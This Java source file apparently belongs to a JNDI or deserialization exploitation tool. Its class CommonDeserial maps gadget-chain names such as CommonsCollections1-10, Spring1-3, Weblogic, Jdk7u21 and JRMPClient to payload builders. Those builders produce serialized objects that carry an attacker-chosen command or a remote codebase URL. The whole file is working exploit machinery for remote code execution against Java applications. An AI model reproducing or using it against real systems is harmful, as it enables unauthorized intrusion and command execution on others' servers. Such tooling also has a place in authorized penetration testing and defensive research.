package jndi;

import payloads.*;

import java.net.URL;
import java.util.Base64;

public class CommonDeserial {
    private URL codebase;
    private String command;

    public CommonDeserial(URL codebase, String command){
        this.codebase = codebase;
        this.command = command;
    }

    public byte[] execByDeserialize(String gadgetType) throws Exception {
        byte[] bytes = {};
//        System.out.println(gadgetType);
        switch (gadgetType){
            case "CommonsBeanutils1":
                bytes = CommonsBeanutils1.getBytes(command);
                break;
            case "CommonsBeanutils2":
                bytes = CommonsBeanutils2.getBytes(command);
                break;
            case "CommonsCollections1":
                bytes = CommonsCollections1.getBytes(command);
                break;
            case "CommonsCollections2":
                bytes = CommonsCollections2.getBytes(command);
                break;
            case "CommonsCollections3":
                bytes = CommonsCollections3.getBytes(command);
                break;
            case "CommonsCollections4":
                bytes = CommonsCollections4.getBytes(command);
                break;
            case "CommonsCollections5":
                bytes = CommonsCollections5.getBytes(command);
                break;
            case "CommonsCollections6":
                bytes = CommonsCollections6.getBytes(command);
                break;
            case "CommonsCollections7":
                bytes = CommonsCollections7.getBytes(command);
                break;
            case "CommonsCollections8":
                bytes = CommonsCollections8.getBytes(command);
                break;
            case "CommonsCollections9":
                bytes = CommonsCollections9.getBytes(command);
                break;
            case "CommonsCollections10":
                bytes = CommonsCollections10.getBytes(command);
                break;
            case "AspectJWeaver":
                bytes = AspectJWeaver.getBytes(command);
                break;
            case "BeanShell1":
                bytes = BeanShell1.getBytes(command);
                break;
            case "C3P0":
                if (codebase != null){
                    bytes = C3P0.getBytes(codebase);
                }else{
                    System.out.println("Gadget " + gadgetType + "'s Payload Need to be URL(http/https)");
                }
                break;
            case "Click1":
                bytes = Click1.getBytes(command);
                break;
            case "Clojure":
                bytes = Clojure.getBytes(command);
                break;
            case "FileUpload1":
                bytes = FileUpload1.getBytes(command);
                break;
            case "Groovy1":
                bytes = Groovy1.getBytes(command);
                break;
            case "Hibernate1":
                bytes = Hibernate1.getBytes(command);
                break;
            case "Hibernate2":
                if (codebase != null){
                    bytes = Hibernate2.getBytes(codebase);
                }else{
                    System.out.println("Gadget " + gadgetType + "'s Payload Need to be URL(http/https)");
                }
                break;
            case "JavassistWeld1":
                bytes = JavassistWeld1.getBytes(command);
                break;
            case "JBossInterceptors1":
                bytes = JBossInterceptors1.getBytes(command);
                break;
            case "JSON1":
                bytes = JSON1.getBytes(command);
                break;
            case "Jython1":
                bytes = Jython1.getBytes(command);
                break;
            case "MozillaRhino1":
                bytes = MozillaRhino1.getBytes(command);
                break;
            case "MozillaRhino2":
                bytes = MozillaRhino2.getBytes(command);
                break;
            case "Myfaces1":
                bytes = Myfaces1.getBytes(command);
                break;
            case "Myfaces2":
                if (codebase != null){
                    bytes = Myfaces2.getBytes(codebase);
                }else{
                    System.out.println("Gadget " + gadgetType + "'s Payload Need to be URL(http/https)");
                }
                break;
            case "ROME1":
                bytes = ROME1.getBytes(command);
                break;
            case "ROME2":
                bytes = ROME2.getBytes(command);
                break;
            case "Spring1":
                bytes = Spring1.getBytes(command);
                break;
            case "Spring2":
                bytes = Spring2.getBytes(command);
                break;
            case "Spring3":
                if (codebase != null){
                    bytes = Spring3.getBytes(codebase);
                }else{
                    System.out.println("Gadget " + gadgetType + "'s Payload Need to be URL(http/https)");
                }
                break;
            case "URLDNS":
                bytes = URLDNS.getBytes(command);
                break;
            case "Vaadin1":
                bytes = Vaadin1.getBytes(command);
                break;
            case "Wicket1":
                bytes = Wicket1.getBytes(command);
                break;
            case "WildFly1":
                if (codebase != null){
                    bytes = WildFly1.getBytes(codebase);
                }else{
                    System.out.println("Gadget " + gadgetType + "'s Payload Need to be URL(http/https)");
                }
                break;
            case "Weblogic1":
                bytes = Weblogic1.getBytes(command);
                break;
            case "Weblogic2":
                bytes = Weblogic2.getBytes(command);
                break;
            case "Jdk7u21":
                bytes = Jdk7u21.getBytes(command);
                break;
            case "JRMPClient":
                bytes = JRMPClient.getBytes(command);
                break;

            default:
                System.out.println("No such Deserial Payload Name");
                break;
        }
//        System.out.println("Base64 Payload: " + Base64.getEncoder().encodeToString(bytes));

        return bytes;
    }

}
